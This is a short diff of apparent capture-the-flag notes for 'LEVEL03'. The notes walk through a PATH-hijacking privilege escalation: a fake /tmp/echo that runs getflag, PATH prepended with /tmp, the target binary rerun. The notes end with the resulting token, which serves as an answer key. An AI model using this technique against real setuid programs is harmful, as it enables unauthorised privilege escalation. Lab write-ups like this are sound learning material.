@@ -1,0 +1,8 @@
+LEVEL03:
+./level03 -> "Exploit me"
+ltrace ./level03
+vim /tmp/echo "getflag"
+chmod 777 /tmp/echo
+export PATH=/tmp:$PATH
+./level03
+-> token : qi0maab88jeaj46qoumi7maus
